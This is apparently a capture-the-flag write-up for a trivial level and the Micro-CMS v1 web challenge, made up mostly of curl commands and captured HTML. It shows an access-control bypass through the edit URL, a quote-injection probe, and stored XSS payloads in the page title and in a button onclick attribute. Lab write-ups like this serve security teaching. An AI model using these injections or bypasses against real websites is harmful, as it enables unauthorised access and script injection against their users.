## TRIVIAL : little something to get you started 
being trivial flag must be in the source, so using `curl`
- `$ curl <url-instance>`

gives the source :
```
<!doctype html>
<html>
	<head>
		<style>
			body {
				background-image: url("background.png");
			}
		</style>
	</head>
	<body>
		<p>Welcome to level 0.  Enjoy your stay.</p>
	</body>
</html>
```
notice `background-image: url("background.png");`
again with `/background.png`
- `$ curl <url-instance>/background.png`

gives :
`^FLAG^<flag>$FLAG$` 
here `<flag>` is a placeholder to the real flag.
* * *
## EASY : Micro-CMS v1
on thinkering with source and ui, structure ::
page urls :: `<url-instance>/page/<page-number>`
edit page urls :: `<url-instance>/page/edit/<page-number>`
- **FLAG 1**
    editing and traversing pages in order fetches 'NOT FOUND',
    - `$ curl <url-instance>/page/<page-number>`
        ```
        <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
        <title>404 Not Found</title>
        <h1>Not Found</h1>
        <p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>
        ```
    BUT, on one of the pages fetches 'FORBIDDEN',
    - `$ curl <url-instance>/page/<page-number>`
        ```
        <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
        <title>403 Forbidden</title>
        <h1>Forbidden</h1>
        <p>You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
        ```
    hence, we cant really see what there is on this page so as a work around we'll change url in order to edit the page,
    - `url <url-instance>/page/edit/<page-number-forbidden`
        ```
        <!doctype html>
        <html>
	        <head>
		        <title>Edit page</title>
	        </head>
	        <body>
		        <a href="../../">&lt;-- Go Home</a>
		        <h1>Edit Page</h1>
		        <form method="POST">
			        Title: <input type="text" name="title" value="Private Page"><br>
			        <textarea name="body" rows="10" cols="80">My secret is ^FLAG^<flag>$FLAG$</textarea><br>
			        <input type="submit" value="Save">
			        <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
		        </form>
	       </body>
        </html>
        <!--flag in <textarea> under holder <flag>-->
        ```
- **FLAG 2**
    simple injection on url under `/edit/` with `'`
    - `$ curl <url-instance>/page/edit/<any-page-number>\'`
    - `$ curl <url-instance>/page/edit/<any-pagenumber>\'"awd"sasatsgasgas`
    turns out if characters are appended after `'` doesn't change much in output!
    
    these commands outputs gives required flag.
- **FLAG 3**
    Micro-CMS is vulnerable to XSS so after trying for a while xss does comes out ahead for remaining flags.
    the way this page is created it mitigates xss injection on `<textarea>` and actively changes `<script></script>` to `<scrubbed></scrubbed>`
    - `$ curl <url-instance>/page/edit/1`
        ```
        <!doctype html>
        <html>
	        <head>
		        <title>Edit page</title>
	        </head>
	        <body>
		        <a href="../../">&lt;-- Go Home</a>
		        <h1>Edit Page</h1>
		        <form method="POST">
			        Title: <input type="text" name="title" value="Testing"><br>
			        <textarea name="body" rows="10" cols="80">&lt;script&gt;alert('slert')&lt;/script&gt;</textarea><br>
			        <input type="submit" value="Save">
			        <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
		        </form>
	        </body>
        </html>
        ```
    XSS in `<textarea>` changes to 
    - `$ curl <url-instance>/page/1`
        ```
        <!doctype html>
        <html>
	        <head>
		        <title>Testing</title>
	        </head>
	        <body>
		        <a href="../">&lt;-- Go Home</a><br>
		        <a href="edit/1">Edit this page</a>
		        <h1>Testing</h1>
                <scrubbed>alert('slert')</scrubbed>
	        </body>
        </html>
        ```
    furthermore, if we use same XSS on `Title : <input..>` it works( requires to navigate to base url after saving)!
    - `$ curl <url-instance>/page/edit/1`
        ```
        <!doctype html>
        <html>
	        <head>
		        <title>Edit page</title>
	        </head>
	        <body>
		        <a href="../../">&lt;-- Go Home</a>
		        <h1>Edit Page</h1>
		        <form method="POST">
			        Title: <input type="text" name="title" value="&lt;script&gt;alert('slert')&lt;/script&gt;"><br>
			        <textarea name="body" rows="10" cols="80">&lt;script&gt;alert('slert')&lt;/script&gt; </textarea><br>
			        <input type="submit" value="Save">
			        <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
		        </form>
	        </body>
        </html>
        ```
    payload in form's `<input value="..">`
    - `$ curl <url-instance>/page/1`
        ```
        <!doctype html>
        <html>
	        <head>
		        <title>&lt;script&gt;alert('slert')&lt;/script&gt;</title>
	        </head>
	        <body>
		        <a href="../">&lt;-- Go Home</a><br>
		        <a href="edit/1">Edit this page</a>
		        <h1>&lt;script&gt;alert('slert')&lt;/script&gt;</h1>
                <scrubbed>alert('slert')</scrubbed>
	        </body>
        </html>
        ```
    to finally obtain the flag navigate back to base url to Micro-CMS url, giving flag as an alert
    - `$ curl <url-instance>`
        ```
        <!doctype html>
        <html>
	        <head>
		        <title>Micro-CMS</title>
	        </head>
	        <body>
		        <ul>
                    <li><a href="page/1"><script>alert("^FLAG^<flag>$FLAG$");</script><script>alert('slert')</script></a></li>
                    <li><a href="page/2">Markdown Test</a></li>
                    <li><a href="page/9">awd</a></li>
		        </ul>
		        <a href="page/create">Create a new page</a>
	        </body>
        </html>
        <!--flag under <href> with <flag> placeholder-->
        ```
- **FLAG 4**
    XSS can be injected to buttons, under edit pages insert payload
    `<button onclick=alert("xss")>call</button>`
    - `$ curl <url-instance>/page/edit/10`
        ``` 
        <!doctype html>
        <html>
	        <head>
		        <title>Edit page</title>
	        </head>
	        <body>
		        <a href="../../">&lt;-- Go Home</a>
		        <h1>Edit Page</h1>
		        <form method="POST">
			        Title: <input type="text" name="title" value="button"><br>
			        <textarea name="body" rows="10" cols="80">&lt;button onclick=alert(&quot;aha&quot;)&gt;call&lt;/button&gt;</textarea><br>
			        <input type="submit" value="Save">
			        <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
		        </form>
	        </body>
        </html>
        ```
    button xss onclick function calls alert!
    - `$ curl <url-instance>/page/10`
        ```
        <!doctype html>
        <html>
	        <head>
		        <title>button</title>
	        </head>
	        <body>
		        <a href="../">&lt;-- Go Home</a><br>
		        <a href="edit/10">Edit this page</a>
		        <h1>button</h1>
                <p><button flag="^FLAG^<flag>$FLAG$" onclick=alert("aha")>call</button></p>
	        </body>
        </html>
        <!--flag under placeholder <flag>-->
        ```
* * *
